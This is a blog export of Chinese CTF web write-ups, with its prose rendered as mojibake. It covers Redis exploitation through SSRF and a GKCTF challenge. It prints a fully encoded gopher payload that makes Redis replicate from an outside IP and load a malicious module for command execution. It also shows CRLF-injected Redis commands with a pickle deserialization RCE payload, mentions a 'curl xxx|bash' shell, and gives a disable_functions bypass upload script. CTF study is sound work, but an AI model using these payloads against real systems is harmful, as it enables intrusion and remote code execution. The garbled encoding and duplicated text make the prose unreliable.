ç•™ç»™RCTFwpçš„ã€‚ç°åœ¨çœ‹éƒ½ä¸ç”¨å†™äº†,åæ­£åªä¼šä¸€é“ã€‚åŸå…ˆå¬è¯´è¿‡ROISçš„webå¾ˆå¼ºï¼Œzsxå¤§å¸ˆå‚…æ˜¯å·¨ä½¬ï¼Œæ²¡æƒ³åˆ°ææ€–å¦‚æ–¯ã€‚(è¿™å°±æ˜¯ROISè·Ÿzsxçš„å¯æ€•ä¹‹å¤„å—,æ€•äº†æ€•äº†) æ‰€ä»¥æ¯”èµ›ç¬¬ä¸€å¤©ç•™æ„åˆ°æœ‰ä¸ªpwnhubå…¬å¼€èµ›ï¼Œäºæ˜¯å°±å»æ°´äº†ä¸‹ï¼Œå¥½æ­¹æ˜¯æ‹¿äº†ä¸ªé‚€è¯·ç ã€‚è¿™é¢˜å› ä¸ºæ˜¯redisç›¸å…³ï¼Œè”æƒ³åˆ°ä¹‹å‰ç½‘é¼æ¯ç„æ­¦çš„é‚£é“redisï¼ŒåŠ ä¸Šè‡ªå·±åŸæ¥åŸºæœ¬æ²¡åšè¿‡redisé¢˜ï¼Œæ‰“ç®—æŠŠè¿™ä¸¤é“é¢˜ç›¸å…³çŸ¥è¯†ç‚¹éƒ½æ€»ç»“ä¸‹ï¼Œå½“åšè¿™å­¦æœŸçš„æ”¶å°¾å§ã€‚","text":"æœ¬å­¦æœŸæœ€åä¸€ç¯‡æ–‡ç« ã€‚å†™å®Œå°±è¦å¤ä¹ å»äº†ã€‚ æ–‡ç« å†™åœ¨RCTFç¬¬ä¸€å¤©ã€‚webç‹—çœŸå®è‡ªé—­.æœ¬æ¥æƒ³æŠŠå‡æœŸå‰æœ€åä¸€ç¯‡æ–‡ç« ç•™ç»™RCTFwpçš„ã€‚ç°åœ¨çœ‹éƒ½ä¸ç”¨å†™äº†,åæ­£åªä¼šä¸€é“ã€‚åŸå…ˆå¬è¯´è¿‡ROISçš„webå¾ˆå¼ºï¼Œzsxå¤§å¸ˆå‚…æ˜¯å·¨ä½¬ï¼Œæ²¡æƒ³åˆ°ææ€–å¦‚æ–¯ã€‚(è¿™å°±æ˜¯ROISè·Ÿzsxçš„å¯æ€•ä¹‹å¤„å—,æ€•äº†æ€•äº†) æ‰€ä»¥æ¯”èµ›ç¬¬ä¸€å¤©ç•™æ„åˆ°æœ‰ä¸ªpwnhubå…¬å¼€èµ›ï¼Œäºæ˜¯å°±å»æ°´äº†ä¸‹ï¼Œå¥½æ­¹æ˜¯æ‹¿äº†ä¸ªé‚€è¯·ç ã€‚è¿™é¢˜å› ä¸ºæ˜¯redisç›¸å…³ï¼Œè”æƒ³åˆ°ä¹‹å‰ç½‘é¼æ¯ç„æ­¦çš„é‚£é“redisï¼ŒåŠ ä¸Šè‡ªå·±åŸæ¥åŸºæœ¬æ²¡åšè¿‡redisé¢˜ï¼Œæ‰“ç®—æŠŠè¿™ä¸¤é“é¢˜ç›¸å…³çŸ¥è¯†ç‚¹éƒ½æ€»ç»“ä¸‹ï¼Œå½“åšè¿™å­¦æœŸçš„æ”¶å°¾å§ã€‚ ç½‘é¼æ¯ç„æ­¦ç»„ssrfmeè¿™é¢˜çœŸæ²¡æƒ³åˆ°ï¼Œæ˜¯éƒå¸ˆå‚…å‡ºçš„é¢˜â€¦â€¦ç½‘ä¸Šå¤§éƒ¨åˆ†åšæ³•éƒ½æ˜¯ä¸»ä»å¤åˆ¶RCEåšçš„ï¼Œä¸è¿‡éƒå¸ˆå‚…è¯´è¯•è¯•ä¸ç”¨ä¸»ä»å¤åˆ¶åš,ä¸çŸ¥é“æ˜¯ä»€ä¹ˆå§¿åŠ¿ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?php function check_inner_ip($url) &#123; $match_result=preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result) &#123; die('url fomat error'); &#125; try &#123; $url_parse=parse_url($url); &#125; catch(Exception $e) &#123; die('url fomat error'); return false; &#125; $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16; &#125; function safe_request_url($url) &#123; if (check_inner_ip($url)) &#123; echo $url.' is inner ip'; &#125; else &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info['redirect_url']) &#123; safe_request_url($result_info['redirect_url']); &#125; curl_close($ch); var_dump($output); &#125; &#125; if(isset($_GET['url']))&#123; $url = $_GET['url']; if(!empty($url))&#123; safe_request_url($url); &#125; &#125;else&#123; highlight_file(__FILE__);&#125;// Please visit hint.php locally. ?&gt; é¦–å…ˆæ‹¿åˆ°é¢˜ç›®æ˜¯ç»å…¸çš„yuligeæ ‡é…ssrfã€‚å¯ä»¥çœ‹åˆ°,æˆ‘ä»¬å…è®¸ä½¿ç”¨çš„schemeæ˜¯http,gopherä»¥åŠdictã€‚ç„¶åéœ€è¦ç»•è¿‡ä¸€ä¸ªå†…ç½‘ipæ£€æµ‹ï¼Œå³å¯è¿›è¡Œcurlçš„ssrf. çœ‹åˆ°æç¤ºè¯´è®¿é—®hint.phpã€‚çœ‹æ¥éœ€è¦ç»•è¿‡ipé™åˆ¶è¿›è¡Œå†…ç½‘è®¿é—®ã€‚è¿™ä¸ªç‚¹ä¹‹å‰æ€»ç»“ssrfæ—¶æåˆ°è¿‡,ç®—æ˜¯åŸºæœ¬trickäº† 1url&#x3D;http:&#x2F;&#x2F;bycsec.top@0.0.0.0&#x2F;hint.php 0.0.0.0é»˜è®¤æœ¬åœ°ã€‚@åˆ™æ˜¯å› ä¸ºphpparse_urlåªä¼šåŒ¹é…åˆ°æœ€åä¸€ä¸ª@åçš„å†…å®¹çš„åŸå› ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡äº†ã€‚ å¾—åˆ°ä¸€ä¸ªrediså¯†ç ã€‚ä¸‹é¢æ˜¯è¯•å›¾å¾—åˆ°webshell é€šå¸¸æ¥è¯´ssrf+redis getshellä¸»è¦æ˜¯è¿™å‡ ç§å§¿åŠ¿ å¯å†™webshellã€‚ å†™sshå…¬é’¥ å†™crontabåå¼¹shell(ä»…é™centos) ä¸»ä»å¤åˆ¶RCE è¿™é‡Œæœ€ç®€å•çš„æ˜¯å¯å†™webshellçš„æƒ…å†µã€‚å…·ä½“ä¸Šå°±è·Ÿä¹‹å‰GKCTFé‚£é¢˜ä¸€æ ·ï¼Œpayloadç¼–ç å¥½å°±èƒ½ç”¨gopheræ‰“ã€‚ æ­¤å¤„è™½ç„¶æ˜¯php,ä½†æ˜¯å¹¶ä¸èƒ½å†™webshellã€‚å‰©ä¸‹çš„å½“ç„¶æ˜¯æ›´ä¸å¯èƒ½çš„ã€‚å› ä¸ºæ²¡æœ‰sshè·ŸcrontabæœåŠ¡ã€‚é‚£ä¹ˆå€¼å¾—ä¸€è¯•çš„å°±æ˜¯ä¸»ä»å¤åˆ¶RCEäº† è¯¦ç»†çŸ¥è¯†å¯ä»¥å»çœ‹éƒå¸ˆå‚…åœ¨xrayç¤¾åŒºå‘çš„rediså®‰å…¨å­¦ä¹ å°è®°ã€‚ ä¸»ä»å¤åˆ¶ï¼Œä¸»è¦åˆ©ç”¨çš„å°±æ˜¯redisSLAVE OFçš„å‘½ä»¤ï¼Œå°†ä¸€å°redisçš„æ•°æ®å¤åˆ¶åˆ°å¦ä¸€å°ã€‚å‰è€…ä¸ºä¸»èŠ‚ç‚¹ï¼Œåè€…ä¸ºä»èŠ‚ç‚¹ã€‚è¿™ä¸ªå¤åˆ¶è¿‡ç¨‹æ˜¯å•å‘çš„ã€‚ è€Œæˆ‘ä»¬redisä¸»ä»å¤åˆ¶RCEçš„æ–¹å¼ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨äº†redisç®€æ´çš„åè®®ï¼Œæ„é€ æ¶æ„æœåŠ¡å™¨ï¼Œå°†åŸæœ¬ç”¨äºå­˜å‚¨å¤‡ä»½çš„rdbæ–‡ä»¶,æ›¿æ¢ä¸ºæˆ‘ä»¬æ¶æ„çš„exp.soã€‚è¿™æ ·èŠ‚ç‚¹redisä¸­å°±ä¼šè‡ªåŠ¨ç”Ÿæˆexp.soï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨load_moduleè¿›è¡Œrce. éœ€è¦æ³¨æ„çš„æ˜¯,å› ä¸ºåˆ©ç”¨rediså†™æ–‡ä»¶çš„æ–¹å¼å†™å…¥exp.soä¼šå› ä¸ºredisçš„å¤§é‡æ— ç”¨æ•°æ®paddingå½±å“å…¶æ­£å¸¸ä½¿ç”¨ã€‚è€Œæˆ‘ä»¬åˆ©ç”¨ä¸»ä»å¤åˆ¶ä¸Šä¼ soï¼Œä¸»è¦ç”¨åˆ°çš„æ˜¯webåº”ç”¨å±‚é¢çš„ä¸Šä¼ ã€‚è€Œphpé»˜è®¤çš„www-dataæ˜¯644,æ‹¥æœ‰åªè¯»æƒé™ã€‚å®æˆ˜ä¸­æ˜¯å®Œå…¨å¯ä»¥ç»“åˆä¸Šä¼ æ”»å‡»çš„ã€‚ å› æ­¤æœ¬é¢˜åªè¦ç”¨åˆ°ä¸¤ä¸ªä¸¤ä¸ªå·¥å…·å³å¯https://github.com/xmsec/redis-ssrfhttps://github.com/n0b0dyCN/redis-rogue-server å‰è€…ç”¨äºç”Ÿæˆpayloadï¼ŒåŒæ—¶ä¹Ÿå¯å¯åŠ¨æ¶æ„serverã€‚åè€…ä¸»è¦æ˜¯exp.soã€‚å»ºè®®æŠŠexp.soç›´æ¥æ‹·åˆ°å‰é¢æ–‡ä»¶å¤¹ä¸‹å°±è¡Œäº†ã€‚ ç„¶åæˆ‘ä»¬è®¾ç½®å¯¹åº”çš„payloadã€‚ä¿®æ”¹ssrf-redis.pyåœ¨é»˜è®¤çš„rceæ¨¡å¼ä¸‹,åªè¦æ”¹å‘½ä»¤ï¼Œlhost,lport,å¯†ç å³å¯ã€‚ç„¶åå¯åŠ¨æ¶æ„æœåŠ¡å™¨ã€‚ç”¨å‰é¢ç”Ÿæˆå¥½çš„payloadç›´æ¥æ‰“ã€‚url=gopher%3a%2f%2fwww.bycsec.top%400.0.0.0%3a6379%2f_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%252430%250D%250Awelcometowangdingbeissrfme6379%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250A120.27.246.202%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2ftmp%2f%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2ftmp%2fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252413%250D%250Acat%2524%257BIFS%257D%2ffl%252A%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250Aç¬¬ä¸€æ¬¡æ‰“ä¼šå»ºç«‹å¥½ä¸»ä»å¤åˆ¶ã€‚è¿™æ—¶å€™å°±å¯ä»¥å…³æ‰serverç›´æ¥ç”¨ssrfå‘½ä»¤è¿›è¡ŒRCEäº†ã€‚ pwnhubå…¬å¼€èµ›-ä¸ƒçˆªé±¼ flagåœ¨çº¿çˆ¬å–ç³»ç»Ÿè¿™æ¬¡åšé¢˜æœ¬æ¥æ˜¯å› ä¸ºè¢«RCTFè™æƒ¨äº†è·‘å»çœ‹çœ‹çš„ã€‚ç»“æœéš¾åº¦ä¼¼ä¹é€‚ä¸­ã€‚åˆšå¥½ç»™æˆ‘ä¸€ç‚¹ç‚¹æ»¡è¶³æ„Ÿã€‚ é¦–å…ˆé¢˜ç›®serveræ˜¯gunicornçš„é…ç½®ã€‚è¿™ä¸ªä»headerä¸­å¯ä»¥çœ‹å‡ºæ¥ã€‚ç„¶åæ³¨å†Œç™»å½•åå‘ç°æœ‰ä¸€ä¸ªçˆ¬è™«/spiderè·¯ç”±ã€‚æ‹¿file:///etc/passwdæ‰“ä¸€å‘å¯ä»¥è¯»åˆ°/etc/passwd.çœ‹æ¥åˆæ˜¯ä¸ªssrfã€‚åŒæ—¶æ³¨æ„åˆ°ç”¨æˆ·é‡Œæœ‰redis-dbè·Ÿserver.çœ‹æ¥æ˜¯æœ‰redisäº†ã€‚ ç®€å•æ¢æµ‹ä¸‹å‘ç°6379ç«¯å£æœ‰redisçš„æŠ¥é”™å›æ˜¾ã€‚ ç¬¬ä¸€ååº”å…ˆè¯»äº†ä¸‹bash_historyã€‚å‘ç°ä¸€ä¸ªæ²¡æƒé™ä¸€ä¸ªä¸å­˜åœ¨ã€‚(å‡å¦‚èƒ½ç”¨è¿™ç§æ–¹å¼çŸ¥é“æ ¹ç›®å½•flagçš„åç§°é‚£å°±ä¼šç®€ä¾¿å¾ˆå¤šï¼Œè¿™ä¹Ÿæ˜¯æˆ‘åœ¨wustctfå½“æ—¶ç›´æ¥è¯»åˆ°flagçš„éé¢„æœŸæ€è·¯) ç„¶åæœŸé—´è§¦å‘äº†æŠ¥é”™ã€‚å‘ç°æ˜¯pythonçš„urllibåº“è°ƒç”¨çš„urlopenã€‚è¿™ä¸ªåº“ç†Ÿæ‚‰çš„è¯åº”è¯¥éƒ½çŸ¥é“æ˜¯å­˜åœ¨CRLFçš„æ´çš„ã€‚æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªssrfå¾€è‡ªå·±æœåŠ¡å™¨æ‰“ä¸€æ³¢ã€‚ncç›‘å¬çš„è¯ä¼šå‘ç°æ˜¯python3.5çš„urllibã€‚ å¯¹urllibçš„ssrf,ç”¨httpåè®®ä¸‹çš„å¯ä»¥ç›´æ¥æ‰“ 123456http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aKEYS%20*%0d%0apaddingåªè¿”å›$-1http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aconfig%20set%20dir%20&#x2F;tmp%0d%0aconfig%20set%20dbfilename%20byc%0d%0asave%0d%0apaddingfile:&#x2F;&#x2F;&#x2F;tmp&#x2F;bycæˆåŠŸå†™å…¥æ–‡ä»¶ é‚£ä¹ˆæ­¤æ—¶å¤§è‡´ç¡®è®¤å¯ä»¥ç”¨è¿™ä¸ªssrfæ‰“redisäº†ã€‚ä½†æ˜¯è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬pythonæœåŠ¡å™¨ä¸èƒ½ç›´æ¥å†™webshellã€‚ä¸èƒ½å†™å®šæ—¶å’Œkeyã€‚è€Œä¸”ç”±äºgopherä¸æ”¯æŒä¹Ÿä¸èƒ½è¿›è¡ŒRCEã€‚æ¢è¨€ä¹‹æˆ‘ä»¬åªèƒ½å¯¹redisè¿›è¡Œå‘½ä»¤æ“ä½œã€‚æ‰€ä»¥æˆ‘æƒ³å…ˆå°è¯•æ¢æµ‹æºç ä¿¡æ¯ é¦–å…ˆæ˜¯/proc/self/cmdlineã€‚è¯»åˆ°äº†gunicornçš„ç›¸å…³é…ç½®ã€‚ /usr/local/python3/bin/python3.5/usr/local/python3/bin/gunicorn--config=config.pyrun:app å¾—åˆ°run.pyã€‚è¿™é‡Œç›´æ¥ç”¨/proc/self/cwd/run.pyå»è¯»å·¥ä½œç›®å½•ä¸‹çš„æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117# -*- coding: utf-8 -*-import picklefrom sipder import Spiderfrom redis import StrictRedisfrom flask import Flask, render_template, redirect, session, request, make_response, url_for, abort, render_template_stringfrom user import *app = Flask(__name__)redis = StrictRedis(host='127.0.0.1',port=6379,db=0)@app.route('/')def index(): cookie = request.cookies.get(\"Cookie\") return redirect(url_for(\"login\"))@app.route('/login/',methods=['GET','POST'])def login(): if request.method != 'GET': username = request.form.get('username') password = request.form.get('password') cookie = Cookie() cookie.create = username cookie = cookie.create try: if redis.exists(cookie): user = pickle.loads(redis.get(cookie)) if user.verify_pass(password): resp = make_response(redirect(url_for('home'))) resp.set_cookie('Cookie',cookie) return resp except: abort(500) return render_template(\"login.html\")@app.route('/register/',methods=['GET','POST'])def register(): if request.method != 'GET': email = request.form.get('email') username = request.form.get('username') password = request.form.get('password') user = User(email,username,password) cookie = Cookie() cookie.create = username cookie = cookie.create try: if not redis.exists(cookie): redis.set(cookie,pickle.dumps(user)) resp = make_response(redirect(url_for('home'))) resp.set_cookie(\"Cookie\",cookie) return resp except: abort(500) return render_template(\"register.html\") @app.route('/home/',methods=['GET','POST'])def home(): cookie = request.cookies.get('Cookie') try: if Cookie.verify(cookie) and redis.exists(cookie): user = redis.get(cookie) user = pickle.loads(user) if request.method != \"GET\": formlist = request.form.to_dict() User.modify_info(user,formlist) redis.set(cookie,pickle.dumps(user)) return render_template(\"home.html\",user=user) return render_template(\"home.html\",user=user) except: return abort(500) return redirect(url_for(\"login\"))@app.route('/spider/',methods=['GET','POST'])def spider(): cookie = request.cookies.get('Cookie') try: if Cookie.verify(cookie) and redis.exists(cookie): user = redis.get(cookie) user = pickle.loads(user) except: return abort(500) result='' if request.method == \"GET\": result='' elif request.method != \"GET\" and request.form.get('url')!=None: try: target_url = request.form.get('url') new_spider = Spider(target_url) result = new_spider.spiderFlag() except Excetion as e: result = e return render_template(\"spider.html\",result=str(result),user=user)@app.route('/testSpider/')def TSpider(): html = '&lt;div id=\"flag\"&gt;Flag&#123;hahaha This is a test for tested Spider mode&#125;&lt;/div&gt;' return render_template_string(html)@app.route('/logout/')def logout(): resp = make_response(redirect(url_for('login'))) resp.set_cookie('Cookie','') return resp@app.errorhandler(500)def error(e): return render_template(\"error.html\")if __name__ == \"__main__\": app.run( debug=True, port=5000, host=\"0.0.0.0\" ) ä»è°ƒç”¨çš„åŒ…çœ‹åˆ°è¿˜æœ‰ä¸¤ä¸ªè‡ªå®šä¹‰çš„åŒ…ã€‚ä¹Ÿä¸€å¹¶è¯»ä¸‹æ¥ã€sipder.py 1234567891011121314151617181920212223242526import urllibimport urllib.requestfrom bs4 import BeautifulSoupclass Spider: def __init__(self, url): self.target_url = url def __getResponse(self): try: info = urllib.request.urlopen(self.target_url).read().decode(\"utf-8\") return (info, True) except Exception as err: return (err, False) def spiderFlag(self): infos = self.__getResponse() if infos[1]: soup = BeautifulSoup(infos[0]) flag = soup.find(id=='flag') return infos[0] return flag.text return infos[0] user.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849-*- coding: utf-8 -*-from hashlib import md5# here put the import libclass User(object): def __init__(self,email,username,password): self.email = email self.username = username self.password = md5(password.encode(encoding='utf8')).hexdigest() self.phone = None self.qqnumber = None self.intro = None def verify_pass(self,password): if password and md5(password.encode(encoding='utf8')).hexdigest() == self.password: return True return None @staticmethod def modify_info(obj,dict): for key in dict: if hasattr(obj,key) and dict[key]!='': setattr(obj,key,dict[key]) class Cookie(object): __key = \"abcd\" def __init__(self): __key = \"abcd\" @property def create(self): self.mix_str = (self.username+Cookie.__key).encode(encoding=\"utf8\") self.md5_str = self.username+md5(self.mix_str).hexdigest() return self.md5_str @create.setter def create(self,username): self.username = username @staticmethod def verify(verify_cookie): if verify_cookie: username = verify_cookie[:-32] verify_str = verify_cookie[-32:] return md5((username+Cookie.__key).encode(encoding=\"utf8\")).hexdigest()==verify_str return None è¿™é‡Œä¸»è¦å¾—åˆ°ä¸¤ä¸ªä¿¡æ¯ã€‚redisæ— å¯†ç ã€‚ä¸”æ˜¯ç”¨æ¥å­˜å‚¨cookieçš„ã€‚è€Œcookieçš„å€¼ä¼šè¢«è°ƒç”¨å‡ºæ¥è¿›è¡Œpickleçš„ååºåˆ—åŒ–ã€‚ ä¸ç”¨è¯´ï¼Œæˆ‘ä»¬ä¹Ÿå¤§è‡´æ˜ç™½æ€è·¯äº†ï¼šæ“ä½œredisä¿®æ”¹cookieé”®å¯¹åº”çš„å€¼ã€‚ç”¨cookieåˆ·æ–°è§¦å‘ååºåˆ—åŒ–RCEã€‚è¿™ä¸ªè€ƒç‚¹åœ¨å»å¹´çš„swpuctfçš„web2ä¸­ä¹Ÿå‡ºç°è¿‡ã€‚å¯æƒœè‡ªå·±å› ä¸ºç¯å¢ƒé—®é¢˜ä¸€ç›´æ²¡èƒ½åœ¨buuä¸Šåšã€‚ è¿™é‡ŒåŸºäºæºç æ¯”è¾ƒé½å…¨ã€‚æˆ‘å°±æœ¬åœ°ç®€å•æ­å»ºäº†ä¸€ä¸ªserverã€‚ç„¶åè§¦å‘ä¸€ä¸ªç”Ÿæˆcookieå­˜å‚¨çš„è¿‡ç¨‹ã€‚çœ‹çœ‹å¤§è‡´çš„å­˜å‚¨è§„å¾‹å®é™…ä¸Šå°±æ˜¯ä»¥æˆ‘ä»¬çš„cookieä½œä¸ºé”®ï¼Œpickleçš„opcodeä½œä¸ºå€¼ï¼Œæ¯”flaskçš„é»˜è®¤å­˜å‚¨ç›´è§‚å¾ˆå¤šã€‚ é‚£ä¹ˆå¾ˆç®€å•äº†ï¼Œæˆ‘ä»¬ç”Ÿæˆä¸‹RCEä»£ç  123456789import pickleimport urllib.parseclass exp(object): def __reduce__(self): return (eval,(\"__import__('os').system('echo `ls /` &gt; /tmp/byc')\",))a = exp()s=pickle.dumps(a)print(s) è¿™é‡Œä¸ºäº†ä¸ç»™æœåŠ¡å™¨å¸¦æ¥å›°æ‰°ï¼Œç›´æ¥æŠŠæ ¹ç›®å½•lsçš„ç»“æœå†™åˆ°tmpç›®å½•ä¸‹ï¼Œç„¶åæˆ‘ä»¬å°±èƒ½ç”¨è¯»æ–‡ä»¶çš„é€”å¾„ç›´æ¥è¯»äº†ã€‚ å‘½ä»¤ 1http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aset &quot;byc40418e2b681af1051d6fcb32e3d3f7071f6&quot; &quot;\\x80\\x03cbuiltins\\neval\\nq\\x00X7\\x00\\x00\\x00__import__(&#39;os&#39;).system(&#39;echo &#96;ls &#x2F;&#96; &gt; &#x2F;tmp&#x2F;byc4&#39;)q\\x01\\x85q\\x02Rq\\x03.&quot;%0d%0apadding å¼€å§‹æˆ‘åœ¨æ‹…å¿ƒç¼–ç é—®é¢˜ã€‚åæ¥å‘ç°åº”è¯¥ä¸ç”¨åœ¨æ„ã€‚ç›´æ¥ç”¨python3çš„opcodeç»“æœå°±å¯ä»¥äº†ã€‚åˆ·æ–°ä¸‹cookieå¯¹åº”é¡µé¢,ç„¶åè¯»æ–‡ä»¶file:///tmp/byc4 æ¥ä¸‹æ¥å°±å¯ä»¥ç›´æ¥è¯»flagäº†ã€‚å½“ç„¶åé¢æˆ‘è¯•äº†ä¸‹ç›´æ¥ç”¨curl xxx|bashå¼¹ä¸ªshellä¹Ÿæ˜¯å¯ä»¥çš„ã€‚æ–¹æ³•æœ‰å¾ˆå¤šã€‚ å°ç»“ä¸¤é“é¢˜éƒ½ç®—æ˜¯phpä¸redisä»¥åŠpythonä¸redisçš„ç»å…¸æ­é…äº†ã€‚å½“ç„¶redisçš„åˆ©ç”¨è¿˜æœ‰å¾ˆå¤šï¼Œä»¥åä¼šæ…¢æ…¢å­¦ä¹ ã€‚ ç„¶åRCTFé™©äº›çˆ†é›¶â€¦â€¦calcè¿™é¢˜çœŸçš„æ˜¯å¤ªè€ƒéªŒåŸºæœ¬åŠŸäº†ã€‚åšçš„äººå¿ƒç´¯ã€‚ æœ€åå°±è¦æ”¶å¿ƒå¥½å¥½å¤ä¹ äº†ã€‚è¿™å­¦æœŸå¤§éƒ¨åˆ†æ—¶é—´éƒ½èŠ±åœ¨äº†ctfä¸Šï¼Œè¯¾ä¸šä¸åƒä»¥å¾€é‚£æ ·å¿ƒé‡Œæœ‰åº•äº†ã€‚æ„Ÿè§‰å¾—å¥½å¥½å¤ä¹ ä¸€æŠŠã€‚ç°åœ¨CTFé©¬ä¸Šä¹Ÿå¿«æ‰“ä¸€å¹´äº†ï¼Œè‡ªå·±å¾ˆé«˜å…´æ°´å¹³æ¯”ä»¥å¾€è¦é«˜äº†ä¸å°‘ã€‚ä½†æ˜¯è‡ªå·±ä½œä¸ºx1cçš„webæ‰‹ï¼Œè¿˜æ˜¯æ„Ÿè§‰å®åŠ›è·Ÿåˆ«çš„å¼ºé˜Ÿç›¸æ¯”å·®äº†ä¸å°‘ã€‚å¸Œæœ›æš‘å‡èƒ½å¥½å¥½ç ”ç©¶ä¸‹è‡ªå·±æƒ³å­¦çš„ä¸œè¥¿,å°½é‡è¿‡çš„å……å®ç‚¹å§ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"},{"name":"redis","slug":"redis","permalink":"https://www.bycsec.top/tags/redis/"}]},{"title":"GKCTF2020writeup","slug":"GKCTF2020writeup","date":"2020-05-24T11:47:39.000Z","updated":"2021-02-18T05:09:02.114Z","comments":true,"path":"2020/05/24/GKCTF2020writeup/","link":"","permalink":"https://www.bycsec.top/2020/05/24/GKCTF2020writeup/","excerpt":"è¿™å‘¨æœ«æ‰“äº†ä¸¤ä¸ªæ¯”èµ›ã€‚BJDCTF3rdä¸GKCTF.è¿™é‡Œä¸ªäººè®¤ä¸ºGKCTFçš„é¢˜ç›®æ”¶è·æŒºå¤šçš„,ä½†æ˜¯æ—¶é—´å¤ªç´§ï¼Œè‡ªå·±ä¹Ÿåœ¨ç®€å•é¢˜ä¸Šæµªè´¹äº†ä¸å°‘æ—¶é—´ã€‚æ‰€ä»¥æŠŠæ¯”èµ›æ—¶æ²¡æ¥çš„åŠçœ‹æˆ–è€…æ²¡åšå‡ºæ¥çš„é¢˜éƒ½è¡¥å…¨ã€‚","text":"è¿™å‘¨æœ«æ‰“äº†ä¸¤ä¸ªæ¯”èµ›ã€‚BJDCTF3rdä¸GKCTF.è¿™é‡Œä¸ªäººè®¤ä¸ºGKCTFçš„é¢˜ç›®æ”¶è·æŒºå¤šçš„,ä½†æ˜¯æ—¶é—´å¤ªç´§ï¼Œè‡ªå·±ä¹Ÿåœ¨ç®€å•é¢˜ä¸Šæµªè´¹äº†ä¸å°‘æ—¶é—´ã€‚æ‰€ä»¥æŠŠæ¯”èµ›æ—¶æ²¡æ¥çš„åŠçœ‹æˆ–è€…æ²¡åšå‡ºæ¥çš„é¢˜éƒ½è¡¥å…¨ã€‚ check_iné¢˜ç›®ç»™å‡ºäº†æºç ã€‚åŸºæœ¬æœºç†å°±æ˜¯ä»$_REQUESTé‡Œè·å–Ginkgoå˜é‡ç„¶åevalæ‰§è¡Œã€‚phpinfo()çš„è¯ä¼šå‘ç°å­˜åœ¨disable_function,åˆ—ç›®å½•ä¼šå‘ç°æ ¹ç›®å½•æœ‰readflag.ä½†æ˜¯ä¸è¦ç´§ã€‚æˆ‘ä»¬æœ‰bypassè„šæœ¬ç”¨,ä¸‹é¢å°±æ˜¯ä¹‹å‰åšbuuä¸Šä¸€é“l33t-hosterçš„è„šæœ¬æ‹¿æ¥æ”¹çš„ 123456789101112131415import requestsimport base64url='http://5e0893e9-0a1c-4836-8865-2771c87a52e4.node3.buuoj.cn/'def command(payload): return &#123;\"Ginkgo\":base64.b64encode(payload.encode('utf-8')).decode('utf-8')&#125;payload=\"move_uploaded_file($_FILES['file']['tmp_name'],'/tmp/exploit.php');echo 'ok';var_dump(scandir('/tmp'));\"files = [('file',('exploit.php',open(\"exploit.php\",\"rb\"),'application/octet-stream'))]r = requests.post(url=url,data=command(payload),files=files)r=requests.post(url=url,data=command('include(\"/tmp/exploit.php\");'))print(r.text) è„šæœ¬è¦ä¼ åˆ°/tmpä¸‹,å¦åˆ™å…¶ä»–ç›®å½•åº”è¯¥æ˜¯ä¸å¯å†™çš„ã€‚ç„¶ååŒ…å«å³å¯ã€‚ è€å…«å°è¶…å¸‚å„¿è¿™é¢˜è¯´å®è¯æŒºç®€å•çš„ã€‚å°±æ˜¯æ‰‹æ…¢äº†å‡ æ­¥ã€‚é¦–å…ˆåå°getshellä¸è®²äº†,ä¸»è¦æ˜¯æŒ‰ç…§ç½‘ä¸Šèƒ½æœåˆ°çš„ShopXOå…¨ç‰ˆæœ¬getshellæµç¨‹èµ°ï¼šå…ˆé»˜è®¤å¯†ç ç™»å½•åå°,ä¸‹è½½ä¸»é¢˜å¹¶åŠ ä¸Šwebshellbyc.php,å†é‡æ–°ä¸Šä¼ zipæ–‡ä»¶,è®¿é—®/public/static/index/default/byc.phpå³å¯. æ‹¿åˆ°www-dataçš„shellåå‘ç°éœ€è¦ææƒã€‚ç„¶åæ ¹ç›®å½•flag.hinté‡Œç»™äº†ä¸ªæ—¥æœŸ.ä¸è¿‡æˆ‘å¹¶æ²¡æœ‰æ€ä¹ˆåœ¨æ„è¿™ä¸ªæ—¥æœŸ,è€Œæ˜¯æŒ‰ç…§è‡ªå·±htbæ¸—é€çš„ä¹ æƒ¯æ¥. 